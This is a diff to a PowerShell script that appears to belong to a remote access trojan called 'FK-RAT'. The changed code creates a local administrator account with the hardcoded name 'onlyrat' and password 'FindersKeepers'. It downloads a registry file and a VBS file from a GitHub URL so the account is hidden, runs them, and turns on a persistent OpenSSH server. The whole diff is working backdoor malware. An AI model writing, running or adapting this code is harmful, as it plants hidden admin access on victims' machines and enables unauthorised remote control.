@@ -24,26 +24,31 @@ function createAdmin {
 $temp = "$env:temp"
 $dirName = randomText
 
+$uName = "onlyrat"
+$pWord = (ConvertTo-SecureString  "FindersKeepers" -AsPlainText -Force)
+
+$regName = randomText
+$vbsName = randomText
+
+$location = Get-Location
+
 ## goto Temp and start 
 Set-Location $temp	
 New-Item -Path $temp -Name $dirName -Type Directory
+Set-Location $dirName
 
 ## Create Admin
-$uName = randomText
-$pWord = (ConvertTo-SecureString  "FindersKeepers" -AsPlainText -Force)
 createAdmin -uName $uName -pWord $pWord
 
 ## Hide Admin with registry
 # registry to hide admin
-$regName = randomText
 Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/admin.reg -OutFile "$regName.reg"
 
 # vbs to register the registry
-$vbsName = randomText
 Invoke-WebRequest -URI https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/files/confirm.vbs -OutFile "$vbsName.vbs"
 
 # install the registry
-./"$regName.reg";"$vbsName.vbs"
+Start-Process ./"$regName.reg";"$vbsName.vbs"
 
 ## Enable persistent SSH
 Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
